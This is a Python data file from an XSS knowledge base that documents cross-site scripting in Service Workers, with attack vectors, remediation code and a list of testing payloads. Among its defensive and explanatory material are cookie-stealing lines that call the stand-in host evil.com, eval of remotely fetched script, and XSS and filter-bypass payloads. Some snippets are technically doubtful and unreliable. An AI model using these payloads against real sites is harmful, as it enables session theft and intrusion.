#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easyprotech)
Dev: Brabus
Date: Sat 25 Oct 2025 12:00:00 UTC
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: Service Worker XSS Context - Comprehensive Guide
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in Service Worker Context",
    # Metadata for SIEM/Triage Integration
    "severity": "high",
    "cvss_score": 7.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "service-worker", "pwa", "background-script", "modern-web"],
    "description": """
Service Worker XSS occurs when user input is reflected into Service Worker scripts without proper
sanitization. Service Workers are background scripts that run independently of web pages, intercepting
network requests, caching resources, and providing offline functionality. When malicious code is
injected into Service Worker scripts, it can execute with elevated privileges and persist across
browser sessions.

VULNERABILITY CONTEXT:
Service Worker XSS typically happens when:
1. Dynamic Service Worker registration with user-controlled URLs
2. Service Worker scripts generated from user templates
3. Cache manipulation with malicious responses
4. Push notification content injection
5. Background sync data manipulation
6. Offline page generation with user content

Common in:
- Progressive Web Apps (PWA)
- Offline-first applications
- Caching layers
- Push notification systems
- Background synchronization
- Template-based applications
- CDN configurations
- Mobile applications

SEVERITY: HIGH
Service Workers run in the background with elevated privileges, can intercept all network requests,
manipulate cache, and persist malicious code across browser sessions and even offline usage.
""",
    "attack_vector": """
SERVICE WORKER XSS ATTACK VECTORS:

1. DYNAMIC REGISTRATION INJECTION:
   Server-side registration:
   navigator.serviceWorker.register('/sw.js?user=' + USER_INPUT);

   Attack payload:
   <script>alert(1)</script>

   Result: Service Worker URL becomes /sw.js?user=<script>alert(1)</script>

2. SERVICE WORKER SCRIPT INJECTION:
   Server generates Service Worker:
   self.addEventListener('install', function(event) {
     event.waitUntil(
       caches.open('USER_CACHE').then(function(cache) {
         return cache.addAll([
           '/index.html',
           '/manifest.json',
           USER_INPUT  // Injected URL
         ]);
       })
     );
   });

   Attack payload:
   data:text/javascript,fetch('http://evil.com/steal?c='+document.cookie)

3. CACHE MANIPULATION:
   Service Worker caches malicious content:
   caches.open('v1').then(function(cache) {
     cache.put('/api/user', new Response('<script>alert(1)</script>', {
       headers: {'Content-Type': 'application/json'}
     }));
   });

4. PUSH NOTIFICATION INJECTION:
   self.addEventListener('push', function(event) {
     const options = {
       body: USER_INPUT,  // Notification body
       icon: '/icon.png',
       badge: '/badge.png'
     };
     event.waitUntil(
       self.registration.showNotification('New Message', options)
     );
   });

   Attack payload:
   <script>alert(1)</script>

5. BACKGROUND SYNC INJECTION:
   self.addEventListener('sync', function(event) {
     if (event.tag == 'background-sync') {
       event.waitUntil(
         fetch('/api/sync', {
           method: 'POST',
           body: JSON.stringify({data: USER_INPUT})  // Injected data
         })
       );
     }
   });

6. FETCH EVENT INTERCEPTION:
   self.addEventListener('fetch', function(event) {
     if (event.request.url.includes('/api/user')) {
       event.respondWith(
         fetch(event.request).then(function(response) {
           return response.text().then(function(text) {
             return new Response(text + USER_INPUT, response);  // Injection
           });
         })
       );
     }
   });

ADVANCED SERVICE WORKER ATTACKS:

7. PERSISTENT CODE EXECUTION:
   Service Worker installs malicious cache:
   self.addEventListener('install', function(event) {
     event.waitUntil(
       caches.open('malicious-cache').then(function(cache) {
         return cache.addAll([
           'data:text/html,<script>alert(1)</script>'
         ]);
       })
     );
   });

8. OFFLINE PAGE INJECTION:
   self.addEventListener('fetch', function(event) {
     event.respondWith(
       caches.match('/offline.html').then(function(response) {
         return response || new Response(USER_INPUT);  // Offline XSS
       })
     );
   });

9. MANIFEST INJECTION:
   Service Worker updates manifest:
   caches.open('manifest').then(function(cache) {
     cache.put('/manifest.json', new Response(JSON.stringify({
       name: 'App',
       start_url: USER_INPUT  // Injected start URL
     })));
   });

10. MESSAGE PASSAGE ATTACK:
    Communication between page and Service Worker:
    navigator.serviceWorker.controller.postMessage(USER_INPUT);

    Service Worker receives:
    self.addEventListener('message', function(event) {
      // event.data contains XSS payload
    });

11. INSTALLATION EVENT ABUSE:
    self.addEventListener('install', function(event) {
      event.waitUntil(
        fetch(USER_INPUT).then(function(response) {  // Remote code execution
          return response.text();
        }).then(function(script) {
          eval(script);  // Code execution
        })
      );
    });

12. ACTIVATION PERSISTENCE:
    Service Worker activates and persists:
    self.addEventListener('activate', function(event) {
      event.waitUntil(
        clients.claim().then(function() {
          // Inject script into all open pages
          return clients.matchAll().then(function(clients) {
            clients.forEach(function(client) {
              client.postMessage('<script>alert(1)</script>');
            });
          });
        })
      );
    });

SERVICE WORKER SPECIFIC BYPASSES:

13. SCOPE MANIPULATION:
    Service Worker registration with broad scope:
    navigator.serviceWorker.register('/sw.js', {scope: '/'});

    Then inject into any page on domain

14. UPDATE MECHANISM ABUSE:
    Force Service Worker update with malicious version:
    navigator.serviceWorker.register('/sw-v2.js?xss=<script>alert(1)</script>');

15. UNINSTALLATION PREVENTION:
    Service Worker prevents uninstallation:
    self.addEventListener('beforeunload', function(event) {
      event.preventDefault();
      // Malicious code persists
    });

16. CLIENT CLAIM ATTACK:
    Service Worker claims all clients immediately:
    self.addEventListener('activate', function(event) {
      event.waitUntil(clients.claim());
    });

    Then sends malicious messages to all pages

17. CACHE POISONING:
    Service Worker poisons cache with malicious responses:
    caches.open('v1').then(function(cache) {
      return cache.put('/api/data', new Response('<script>alert(1)</script>'));
    });

18. OFFLINE FALLBACK INJECTION:
    self.addEventListener('fetch', function(event) {
      event.respondWith(
        fetch(event.request).catch(function() {
          return caches.match('/offline.html').then(function(response) {
            return new Response(response.text() + USER_INPUT);  // Offline XSS
          });
        })
      );
    });

REAL-WORLD ATTACK SCENARIOS:

19. PWA CHAT APPLICATION:
    - Service Worker handles offline messages
    - User message: <script>alert(1)</script>
    - Cached for offline use
    - Executes when user goes offline

20. E-COMMERCE PWA:
    - Service Worker caches product pages
    - Product name: <script>alert(1)</script>
    - Cached malicious content
    - Affects all users offline

21. BANKING APPLICATION:
    - Service Worker handles transactions offline
    - Transaction memo: <script>stealCredentials()</script>
    - Persistent credential theft

22. SOCIAL MEDIA PWA:
    - Service Worker manages notifications
    - Notification content: <script>alert(1)</script>
    - Real-time XSS via push notifications

23. COLLABORATIVE PLATFORM:
    - Service Worker syncs documents
    - Document content: <script>alert(1)</script>
    - Affects all collaborators

24. IOT CONTROL PANEL:
    - Service Worker caches device states
    - Device name: <script>alert(1)</script>
    - Device hijacking via cache

SERVICE WORKER DETECTION:

25. MANUAL TESTING:
    - Check Application tab in DevTools
    - Monitor Service Worker registration
    - Test offline functionality
    - Check cached content

26. AUTOMATED SCANNING:
    - Register test Service Workers
    - Send malicious payloads
    - Monitor for script execution
    - Test cache manipulation

27. BROWSER EXTENSIONS:
    - Service Worker interception
    - Payload injection testing
    - Offline behavior analysis
""",
    "remediation": """
SERVICE WORKER XSS DEFENSE STRATEGY:

1. SERVICE WORKER URL VALIDATION (PRIMARY DEFENSE):
   Validate Service Worker registration URLs:

   JavaScript validation:
   function isValidServiceWorkerUrl(url) {
     const allowedDomains = ['yourdomain.com', 'cdn.yourdomain.com'];
     const allowedPaths = ['/sw.js', '/service-worker.js'];

     try {
       const urlObj = new URL(url, location.origin);
       return allowedDomains.includes(urlObj.hostname) &&
              allowedPaths.includes(urlObj.pathname);
     } catch {
       return false;
     }
   }

2. DYNAMIC SERVICE WORKER RESTRICTIONS:
   Avoid dynamic Service Worker registration with user input:

   // BAD - Vulnerable to injection
   navigator.serviceWorker.register(userInput);

   // GOOD - Static registration
   navigator.serviceWorker.register('/static/sw.js');

3. SERVICE WORKER SCRIPT SANITIZATION:
   Sanitize Service Worker script content:

   const DOMPurify = require('dompurify');
   const cleanScript = DOMPurify.sanitize(scriptContent, {
     ALLOWED_TAGS: [],
     ALLOWED_ATTR: []
   });

4. CACHE CONTENT VALIDATION:
   Validate cached content before serving:

   self.addEventListener('fetch', function(event) {
     event.respondWith(
       caches.match(event.request).then(function(response) {
         if (response) {
           return response.text().then(function(text) {
             // Validate cached content
             const cleanText = DOMPurify.sanitize(text);
             return new Response(cleanText, response);
           });
         }
         return fetch(event.request);
       })
     );
   });

5. PUSH NOTIFICATION SANITIZATION:
   Sanitize push notification content:

   self.addEventListener('push', function(event) {
     const data = event.data.json();
     const cleanBody = DOMPurify.sanitize(data.body);

     const options = {
       body: cleanBody,
       icon: validateUrl(data.icon),
       badge: validateUrl(data.badge)
     };
   });

6. BACKGROUND SYNC VALIDATION:
   Validate background sync data:

   self.addEventListener('sync', function(event) {
     event.waitUntil(
       validateAndProcessData(event.tag)
     );
   });

   function validateAndProcessData(tag) {
     return new Promise(function(resolve, reject) {
       // Validate sync data before processing
       const cleanData = DOMPurify.sanitize(syncData);
       // Process only validated data
       resolve(cleanData);
     });
   }

7. MESSAGE VALIDATION:
   Validate messages between page and Service Worker:

   self.addEventListener('message', function(event) {
     const data = event.data;

     // Validate message structure and content
     if (isValidMessage(data)) {
       processMessage(data);
     }
   });

   function isValidMessage(data) {
     // Strict validation of message structure
     return typeof data === 'object' &&
            data.type in ALLOWED_MESSAGE_TYPES &&
            typeof data.content === 'string' &&
            data.content.length < 1000;
   }

8. SCOPE RESTRICTIONS:
   Limit Service Worker scope:

   navigator.serviceWorker.register('/sw.js', {
     scope: '/app/'  // Restrict to specific path
   });

9. UPDATE VALIDATION:
   Validate Service Worker updates:

   self.addEventListener('install', function(event) {
     self.skipWaiting();  // Only if update is validated
   });

10. CLIENT VERIFICATION:
    Verify client origins:

    clients.matchAll().then(function(clients) {
      clients.forEach(function(client) {
        if (!isAllowedOrigin(client.url)) {
          client.close();  // Close unauthorized clients
        }
      });
    });

11. OFFLINE CONTENT SANITIZATION:
    Sanitize offline page content:

    self.addEventListener('fetch', function(event) {
      if (event.request.mode === 'navigate') {
        event.respondWith(
          caches.match('/offline.html').then(function(response) {
            return response.text().then(function(text) {
              const cleanText = DOMPurify.sanitize(text);
              return new Response(cleanText, {
                headers: {'Content-Type': 'text/html'}
              });
            });
          })
        );
      }
    });

12. CSP FOR SERVICE WORKERS:
    Content Security Policy restrictions:

    Content-Security-Policy:
      default-src 'self';
      script-src 'self' 'nonce-{random}';
      connect-src 'self';
      object-src 'none';
      worker-src 'self';

13. SERVICE WORKER DESTRUCTION:
    Proper cleanup on logout:

    navigator.serviceWorker.getRegistration().then(function(registration) {
      if (registration) {
        registration.unregister().then(function(success) {
          if (success) {
            // Clear all caches
            caches.keys().then(function(names) {
              names.forEach(function(name) {
                caches.delete(name);
              });
            });
          }
        });
      }
    });

14. MONITORING AND LOGGING:
    Comprehensive Service Worker monitoring:

    self.addEventListener('install', function(event) {
      console.log('SW installing:', new Date().toISOString());
    });

    self.addEventListener('activate', function(event) {
      console.log('SW activating:', new Date().toISOString());
    });

15. VERSION CONTROL:
    Service Worker versioning:

    const CACHE_VERSION = 'v1.0.0';
    const CACHE_NAME = 'app-cache-' + CACHE_VERSION;

    self.addEventListener('install', function(event) {
      event.waitUntil(
        caches.open(CACHE_NAME).then(function(cache) {
          // Cache validation here
          return cache.addAll(VALIDATED_URLS);
        })
      );
    });

16. TESTING AND VALIDATION:
    Regular security testing:

    Automated tests:
    - Service Worker registration testing
    - Cache content validation
    - Offline functionality testing
    - Push notification security testing

    Manual testing:
    - DevTools Application tab inspection
    - Service Worker script analysis
    - Cache content verification
    - Offline behavior testing

SECURITY TESTING PAYLOADS:

Basic detection:
<script>alert('Service Worker XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

Service Worker specific:
data:text/javascript,self.addEventListener('install',function(){fetch('http://evil.com/steal')})
data:text/javascript,eval('alert(1)')
data:text/html,<script>alert(1)</script>

Bypass attempts:
{{constructor.constructor('alert(1)')()}}
javascript:alert(1)
vbscript:msgbox(1)

SERVICE WORKER SECURITY HEADERS:

Service-Worker-Allowed: /app/
Cache-Control: no-cache
Content-Security-Policy: worker-src 'self'

MONITORING METRICS:

Track and alert on:
- Service Worker registration failures
- Cache corruption attempts
- Push notification abuse
- Background sync anomalies
- Message validation failures

OWASP REFERENCES:
- OWASP PWA Security
- OWASP Service Worker Security
- Service Workers 1 Specification
- Progressive Web Apps Security
""",
}
